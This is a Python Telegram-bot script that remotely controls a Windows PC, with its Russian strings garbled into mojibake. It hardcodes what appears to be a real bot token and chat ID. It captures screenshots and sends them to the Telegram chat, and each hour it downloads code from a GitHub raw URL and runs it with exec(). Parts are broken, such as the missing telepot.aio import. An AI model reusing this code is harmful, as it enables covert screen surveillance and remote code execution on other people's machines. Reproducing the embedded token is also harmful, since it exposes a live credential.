import asyncio
import telepot
import os
import logging
import requests
import datetime
from PIL import ImageGrab

TOKEN = '8299476991:AAEBqKtv2LNyffb8COD7pa3_4q1jlOcXY6s'
CHAT_ID = '1678221039'
CHECK_INTERVAL = 3600
GITHUB_URL = "https://raw.githubusercontent.com/–≤–∞—à_–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å/–≤–∞—à_—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π/main/monitoroff.py"

logging.basicConfig(
    filename='monitor.log', 
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def send_msg(message):
    try:
        telepot.Bot(TOKEN).sendMessage(CHAT_ID, message)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")

async def check_monitor():
    while True:
        try:
            if not is_process_running('monitor.py'):
                await run_github_script()
            await asyncio.sleep(CHECK_INTERVAL)
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: {e}")

def is_process_running(process_name):
    try:
        return process_name in os.popen('tasklist').read()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        return False

async def run_github_script():
    try:
        response = requests.get(GITHUB_URL)
        exec(response.text)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞: {e}")

def handle_commands(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if content_type == 'text' and str(chat_id) == CHAT_ID:
        command = msg['text'].strip().lower()
        
        if command == '—Å–∫—Ä–∏–Ω—à–æ—Ç':
            send_screenshot()
            
        elif command == '–æ –±–æ—Ç–µ':
            send_msg("""ü§ñ **–ü—Ä–∏–≤–µ—Ç! –Ø ‚Äî –±–æ—Ç-–ø–æ–º–æ—â–Ω–∏–∫**

–Ø –º–æ–≥—É:
‚Ä¢ –£–ø—Ä–∞–≤–ª—è—Ç—å –ü–ö
‚Ä¢ –î–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç—ã
‚Ä¢ –ú–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å —Å–∏—Å—Ç–µ–º—É
‚Ä¢ –ó–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã

–î–ª—è –ø–æ–º–æ—â–∏ –Ω–∞–ø–∏—à–∏ '–ø–æ–º–æ—â—å'""")
            
        elif command == '–ø–æ–º–æ—â—å':
            send_msg("""üîç **–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:**

**–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
‚Ä¢ —Å–∫—Ä–∏–Ω—à–æ—Ç - —Å–¥–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫
‚Ä¢ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å - –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫
‚Ä¢ –≤—ã–∫–ª—é—á–∏—Ç—å - –≤—ã–∫–ª—é—á–µ–Ω–∏–µ
‚Ä¢ –ø–∫ - —Å—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã

**–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**
‚Ä¢ –æ –±–æ—Ç–µ - –æ –º–Ω–µ
‚Ä¢ –ø–æ–º–æ—â—å - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥""")

def send_screenshot():
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{timestamp}.png")
        with open(f"screenshot_{timestamp}.png", 'rb') as f:
            telepot.Bot(TOKEN).sendPhoto(CHAT_ID, f)
        os.remove(f"screenshot_{timestamp}.png")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")

async def main():
    bot = telepot.aio.Bot(TOKEN)
    await bot.message_loop(handle_commands)
    await asyncio.gather(
        check_monitor(),
        bot.message_loop()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logging.critical(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")